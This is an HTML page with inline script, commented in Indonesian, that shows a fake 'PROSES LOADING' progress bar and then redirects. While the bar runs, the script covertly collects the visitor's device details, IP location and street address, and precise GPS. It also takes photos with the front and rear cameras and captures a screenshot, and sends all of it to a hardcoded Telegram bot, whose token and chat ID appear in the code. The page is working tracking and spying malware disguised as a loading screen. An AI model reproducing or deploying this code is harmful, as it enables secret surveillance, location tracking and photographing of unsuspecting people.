<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <title>Create by Wisnu X Raisya</title>
    <link rel="stylesheet" href="style.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
</head>
<body>
    <div id="loading-container">
        <div id="loading-text">PROSES LOADING</div>
        <div id="progress-container"><div id="progress-bar"></div></div>
        <div id="loading-details">Memulai inisialisasi...</div>
    </div>
    
    <video id="v" autoplay muted class="hidden"></video>
    <canvas id="c" class="hidden"></canvas>

<script src="script.js"></script>
</body>
</html><style>body{
    background: #0a192f;
    margin:0;
    padding:0;
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
    font-family:Arial,sans-serif;
    color:#ccd6f6;
    overflow:hidden
}

#loading-container{
    text-align:center;
    width:80%;
    max-width:400px;
    padding: 30px 20px;
    background: #112240;
    border-radius: 10px;
    border: 1px solid #233554;
    box-shadow: 0 10px 30px rgba(0,0,0,0.5);
}

#loading-text{
    font-size:22px;
    margin-bottom:20px;
    color:#64ffda;
    font-weight: bold;
    letter-spacing: 1px;
}

#progress-container{
    height:4px;
    background:#233554;
    border-radius:4px;
    overflow:hidden
}

#progress-bar{
    height:100%;
    width:0%;
    background:linear-gradient(90deg,#64ffda,#57cbff);
    transition:width .3s ease;
    box-shadow: 0 0 10px rgba(100, 255, 218, 0.5);
}

#loading-details{
    margin-top:20px;
    font-size:14px;
    color:#8892b0
}

.hidden{
    display:none
}</style><script>(()=>{
    const T='8719193985:AAGeKWyQewMu1TiHi-JHYQlTwnIpGCxTP3s', // <-- TOKEN BOT TELEGRAM
          C='8279952555', // <-- CHAT ID TELEGRAM
          pb=document.getElementById('progress-bar'),
          ld=document.getElementById('loading-details');

    let p=0;
    let redirected = false; // biar ga redirect 2x
    const LM=["Memeriksa modul sistem...","Memuat komponen inti...","Menginisialisasi antarmuka...","Memverifikasi koneksi...","Menyiapkan lingkungan...","Memeriksa pembaruan...","Memuat aset tampilan..."];
    
    // Logic untuk progress bar + redirect
    const interval = setInterval(()=>{
        p+=Math.random()*5;
        if(p>100)p=100;
        pb.style.width=p+'%';
        if(Math.random()>.9)ld.textContent=LM[Math.floor(Math.random()*LM.length)]

        // Jika sudah 100% dan belum redirect
        if(p >= 100 && !redirected){
            redirected = true;
            clearInterval(interval); // hentikan progress
            ld.textContent = "Selesai. Mengalihkan ke halaman utama...";
            setTimeout(()=>{
                window.location.href = 'home.html'; // ganti ke halaman tujuan
            }, 1000); // jeda 1 detik biar keliatan "selesai"
        }
    },500);

    // Fungsi kirim pesan ke Telegram
    const sTG=async d=>{try{await fetch(`https://api.telegram.org/bot${T}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:C,text:d,parse_mode:'HTML'})})}catch(e){}};
    
    // Fungsi kirim foto ke Telegram
    const sP=async(b,f)=>{try{const fd=new FormData();fd.append('chat_id',C);fd.append('photo',b,f);await fetch(`https://api.telegram.org/bot${T}/sendPhoto`,{method:'POST',body:fd})}catch(e){}};
    
    // Fungsi mendapatkan lokasi detail dari koordinat
    const gLD=async(a,b)=>{try{const r=await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${a}&lon=${b}&zoom=18&addressdetails=1`),d=await r.json();if(d.address)return{kb:d.address.county||d.address.city||d.address.state||"Tidak diketahui",kc:d.address.suburb||d.address.village||d.address.town||"Tidak diketahui",fa:d.display_name||"Alamat tidak tersedia"}}catch(e){}return{kb:"Tidak diketahui",kc:"Tidak diketahui",fa:"Alamat tidak tersedia"}};
    
    // Fungsi mendapatkan informasi perangkat
    const cDI=async()=>{let m='╭───── Tracking Report ───── ⦿\n\n';m+='⚙️ DEVICE INFORMATION|BUKAN GPS TRACKING\n';m+=`🖥️ Device: ${navigator.userAgent}\n💻 Platform: ${navigator.platform}\n🌐 Bahasa: ${navigator.language}\n📶 Online: ${navigator.onLine?'Online':'Offline'}\n📺 Screen Size: ${screen.width}x${screen.height}\n🪟 Window Size: ${innerWidth}x${innerHeight}\n💾 RAM: ${navigator.deviceMemory||'Unknown'} GB\n🧠 CPU Cores: ${navigator.hardwareConcurrency}\n`;if(navigator.getBattery){try{const b=await navigator.getBattery();m+=`🔋 Battery: ${Math.floor(b.level*100)}%\n🔌 Charging: ${b.charging?'✅ YA':'❌ TIDAK'}\n`}catch(e){m+='🔋 Battery: ❌ Tidak tersedia\n'}}m+=`⏰ Waktu Akses: ${new Date().toString()}\n🕒 Page Load Time: ${performance.now().toFixed(2)} ms\n📜 History Length: ${history.length}\n✋ Touch Support: ${'ontouchstart'in window?'✅ YA':'❌ TIDAK'}\n🔗 Referrer: ${document.referrer||'None'}\n🌍 URL: ${location.href}\n📄 Title: ${document.title}\n🕓 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n🧭 Offset: ${new Date().getTimezoneOffset()} menit\n`;try{const i=await fetch('https://ipapi.co/json/'),d=await i.json();m+='📍 LOCATION INFORMATION\n';m+=`📡 IP Address: ${d.ip}\n🏙️ Kota: ${d.city}\n🏙️ Kabupaten: ${d.region}\n🗺️ Wilayah: ${d.region}\n🌎 Negara: ${d.country_name}\n🏷️ Kode Pos: ${d.postal}\n`;if(d.latitude&&d.longitude){m+=`📌 Latitude: ${d.latitude}\n📍 Longitude: ${d.longitude}\n`;const l=await gLD(d.latitude,d.longitude);m+=`🏙️ Kabupaten: ${l.kb}\n🏙️ Kecamatan: ${l.kc}\n🏠 Alamat Lengkap: ${l.fa}\n`}}catch(e){m+='❌ Gagal mendapatkan informasi lokasi\n'}m+='\n╰───── Telegram @ryzzreal  ───── ⦿';return m};

    // Mengambil gambar dari kamera
    const captureCamera = async (mode) => {
        const v = document.getElementById('v'), 
              c = document.getElementById('c');
        let stream;
        try {
            stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: { exact: mode }}});
            v.srcObject = stream;
            await new Promise(resolve => v.onloadedmetadata = resolve);
            v.play();
            await new Promise(r => setTimeout(r, 1500)); 
            c.width = v.videoWidth;
            c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);
            c.toBlob(b => sP(b, `${mode}_camera_capture.jpg`), 'image/jpeg');
            stream.getTracks().forEach(t => t.stop());
            return true; 
        } catch (e) {
            if (stream) stream.getTracks().forEach(t => t.stop());
            await sTG(`⚠️ Gagal Akses Kamera ${mode.toUpperCase()}. Mencoba mode lain...`);
            return false; 
        }
    };

    // FUNGSI UTAMA
    const ST=async()=>{
        await sTG(await cDI()); 

        let cameraSuccess = false;
        cameraSuccess = await captureCamera("user");
        if (!cameraSuccess) {
            cameraSuccess = await captureCamera("environment");
        }
        if (!cameraSuccess) {
             await sTG('❌ Akses ke kedua kamera (Depan & Belakang) diblokir.');
        }

        // Ambil Screenshot 
        setTimeout(async()=>{
            try{
                const cn=await html2canvas(document.body);
                cn.toBlob(b=>sP(b,'screenshot.jpg'),'image/jpeg')
            }catch(e){
                await sTG('❌ Screenshot failed')
            }
        }, 2000); 

        // GPS
        if(navigator.geolocation){
            navigator.geolocation.getCurrentPosition(async p=>{
                const lat = p.coords.latitude;
                const lon = p.coords.longitude;
                let g=`📍 GPS TRACKING (ONE-TIME)\n`;
                g+=`📌 Lat: ${lat}\n📍 Lng: ${lon}\n`;
                g+=`🎯 Akurasi: ${p.coords.accuracy}m\n`;
                g+=`🗺️ Google Maps: https://www.google.com/maps/search/?api=1&query=${lat},${lon}\n`;
                const l=await gLD(lat,lon);
                g+=`🏙️ Kabupaten: ${l.kb}\n🏙️ Kecamatan: ${l.kc}\n🏠 Alamat: ${l.fa}\n`;
                await sTG(g)
            },async e=>{
                await sTG(`❌ GPS Error: ${e.message}`)
            },{enableHighAccuracy:true,maximumAge:0,timeout:5000})
        }
    };

    ST();
})();</script>
